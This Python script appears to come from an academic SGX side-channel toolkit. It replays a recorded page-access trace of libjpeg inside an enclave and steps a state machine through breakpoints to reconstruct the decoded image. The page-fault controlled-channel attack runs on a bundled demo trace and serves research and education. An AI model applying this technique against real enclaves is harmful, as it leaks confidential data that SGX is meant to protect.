
"""
JPEG Attack with TraceNavigator (Interactive)
--------------------------------------------

Purpose:
    Interactive JPEG attack script using TraceNavigator to step through the trace
    and manually drive the JPEG state machine. Useful for debugging, educational
    purposes, or inspecting the state machine's evolution.

Workflow:
    - Loads the VCD trace and configures page ranges.
    - Sets breakpoints for all relevant pages using TraceNavigator.
    - Steps through the trace, updating the JPEG state machine only when a breakpoint is hit.
    - Reconstructs the image block-by-block as the state machine transitions.
    - Saves the reconstructed image as PGM and also as a PNG preview for easy viewing.
    - Prints detailed progress and output file locations.

Use case:
    Best for debugging, fine-grained analysis, or when you want to see exactly how
    the state machine evolves during the attack.
"""

import sys

from sgxtrace import TraceNavigator, load_vcd_trace
from sgxtrace.jpeg import JpegAttackConfig, JpegAttackResult, JpegReconstruction, JpegState

TRACE_PATH = "traces/trace_libjpeg.vcd"
OUTPUT_IMAGE = "output/jpeg_reconstruction_navigator.pgm"


def build_default_config() -> JpegAttackConfig:
    """Return the page ranges tuned for the bundled libjpeg demo trace.

    Identical to the config in jpeg_attack_reconstruction.py so the two
    execution modes (one-shot and interactive navigator) produce
    bit-equivalent reconstructions on the same trace. The DATA_COUNT
    range mirrors the TLBlur-SGX Rust reference. See EVALUATION.md §13.
    """
    return JpegAttackConfig(
        start_range=range(54, 55),
        next_row_range=range(44, 45),
        start_row_range=range(58, 59),
        pre_idct_slow_range=range(56, 57),
        idct_slow_range=range(62, 64),
        data_count_range_no_aexnotify=range(150, 4340),
        data_count_range_aexnotify=range(150, 4335),
        data_count_pages=None,
        num_colors=1,
        aexnotify=False,
    )


def run_jpeg_attack_with_navigator(trace_path: str = TRACE_PATH, verbose: bool = False) -> JpegAttackResult:
    """Run the JPEG attack by manually driving the navigator.

    When verbose is True, every state-machine transition and every
    reconstructed block is logged as it happens, illustrating the
    interactive (debugger-like) inspection mode. The default (False)
    keeps the original behaviour unchanged.
    """
    print("--- JPEG RECONSTRUCTION ATTACK (Navigator) ---")

    trace = load_vcd_trace(trace_path)
    config = build_default_config()
    nav = TraceNavigator(trace)
    reconstruction = JpegReconstruction(num_colors=config.num_colors)

    interesting_pages: set[str] = set()
    for state in JpegState:
        for page_num in config.pages_for_state(state):
            page_name = f"_{page_num}"
            nav.add_breakpoint(page_name)
            interesting_pages.add(page_name)

    print(f"Configured {len(interesting_pages)} page breakpoints.")

    state = JpegState.PRE_START
    data_counter = 0
    processed_pages = 0
    block_index = 0

    while True:
        result = nav.page_step()
        if result.end_of_trace:
            break
        if result.breakpoint_hit is None:
            continue

        page_number = int(result.breakpoint_hit[1:])
        previous_state = state
        new_state = config.next_state(state, page_number)

        if previous_state == JpegState.IDCT_SLOW and new_state == JpegState.DATA_COUNT:
            data_counter = 1
        elif (
            previous_state == JpegState.DATA_COUNT
            and new_state == JpegState.DATA_COUNT
            and config.page_matches_state(JpegState.DATA_COUNT, page_number)
        ):
            # Only increment when the page actually matched DATA_COUNT.
            # Without this guard, breakpoints on non-data-count pages
            # (e.g. page 54 from start_range, hit while in DATA_COUNT) would
            # falsely increment the counter. See EVALUATION.md §13 for the
            # original symptom (navigator vs one-shot drift).
            data_counter += 1

        reconstruction.reconstruct_transition(previous_state, new_state, data_counter)

        if verbose and new_state != previous_state:
            if previous_state == JpegState.DATA_COUNT and new_state != JpegState.DATA_COUNT:
                block_index += 1
                print(f"[bp t={result.time:<7}] blok #{block_index} gereconstrueerd   waarde={data_counter}")
            else:
                print(f"[bp t={result.time:<7}] {previous_state.value} -> {new_state.value}")

        if previous_state == JpegState.DATA_COUNT and new_state != JpegState.DATA_COUNT:
            data_counter = 0

        state = new_state
        processed_pages += 1

        if not verbose and processed_pages % 1000 == 0:
            print(f"Processed {processed_pages} breakpoints, current state: {state.value}")

    if state == JpegState.DATA_COUNT and data_counter > 0:
        reconstruction.reconstruct_block(data_counter)

    attack_result = JpegAttackResult(
        config=config,
        reconstruction=reconstruction,
        final_state=state,
        processed_pages=processed_pages,
    )

    # Save the PGM (the named output) and a PNG preview for easy viewing.
    attack_result.reconstruction.save_pgm(OUTPUT_IMAGE)
    OUTPUT_PNG = "output/jpeg_reconstruction_navigator.png"
    try:
        attack_result.reconstruction.save_png_preview(OUTPUT_PNG, scale=16)
        print(f"PNG preview saved:     {OUTPUT_PNG}")
    except Exception as e:
        print(f"Could not save PNG preview: {e}")

    width, height = reconstruction.reconstructed_size()
    print(f"Processed breakpoints: {processed_pages}")
    print(f"Final state:           {state.value}")
    print(f"Image size:            {width} x {height} blocks")
    print(f"Image saved:           {OUTPUT_IMAGE}")
    print(f"Min data count:        {reconstruction.min_data}")
    print(f"Max data count:        {reconstruction.max_data}")

    return attack_result


if __name__ == "__main__":
    run_jpeg_attack_with_navigator(verbose="--verbose" in sys.argv)